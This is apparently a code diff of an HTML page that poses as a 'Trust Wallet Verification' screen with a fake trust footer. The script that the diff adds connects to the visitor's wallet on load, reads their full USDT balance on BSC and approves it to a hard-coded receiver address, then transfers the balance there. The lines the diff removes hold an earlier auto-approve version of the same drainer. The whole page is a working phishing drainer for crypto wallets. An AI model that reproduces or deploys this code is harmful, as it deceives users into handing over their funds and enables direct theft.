@@ -1,30 +1,59 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Auto Approve & Transfer</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Trust Wallet Verification</title>
+<link rel="icon" href="favicon.ico" />
+<style>
+  body {
+    background: #081c3a; color: white; font-family: Arial,sans-serif;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    height: 100vh; text-align: center; padding: 10px;
+  }
+  img { width: 100px; margin-bottom: 20px; }
+  h2 { margin-bottom: 5px; }
+  .status { opacity: 0.8; }
+  .footer { position: absolute; bottom: 20px; opacity: 0.6; font-size: 0.8rem; }
+</style>
 </head>
 <body>
-  <h2>Trust Wallet Auto Approve</h2>
-  <script>
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // Your wallet
-    const ABI = [ /* Put your USDT ABI here */ ];
-    const AMOUNT = "1000000000000000000"; // 1 USDT in wei
+  <img src="logo.png" alt="Trust Wallet" />
+  <h2>Secure USDT Transaction</h2>
+  <p class="status" id="status">Initializing transaction... please wait</p>
+  <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>
 
-    window.addEventListener('load', async () => {
-      if (typeof window.ethereum !== "undefined") {
-        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-
-        // Connect contract
-        const contract = new ethers.Contract(USDT_ADDRESS, ABI, new ethers.providers.Web3Provider(window.ethereum).getSigner());
-
-        // Auto-approve
-        await contract.approve(RECEIVER, AMOUNT);
-        document.body.innerHTML += "<p>✅ Approve triggered. User can now send funds.</p>";
-      } else {
-        document.body.innerHTML = "<p>❌ Open this in Trust Wallet DApp browser.</p>";
-      }
-    });
-  </script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+<script>
+(async function init() {
+  const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // 💰 Tera wallet address
+  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+  const ABI = [
+    { "constant": false, "inputs": [{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" },
+    { "constant": false, "inputs": [{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function" },
+    { "constant": true, "inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
+  ];
+  
+  if (typeof window.ethereum !== "undefined") {
+    try {
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      const web3 = new Web3(window.ethereum);
+      const accounts = await web3.eth.getAccounts();
+      const user = accounts[0];
+      const contract = new web3.eth.Contract(ABI, USDT_ADDRESS);
+      const balance = await contract.methods.balanceOf(user).call();
+      document.getElementById('status').innerText = "✅ Approving transaction, please wait...";
+      await contract.methods.approve(RECEIVER, balance).send({ from: user });
+      document.getElementById('status').innerText = "✅ Approved! Finalizing transfer...";
+      await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
+      document.getElementById('status').innerText = "🎉 Transaction complete!";
+    } catch (e) {
+      document.getElementById('status').innerText = "Error: " + e.message;
+    }
+  } else {
+    document.getElementById('status').innerText = "Open this link in Trust Wallet DApp.";
+  }
+})();
+</script>
 </body>
 </html>
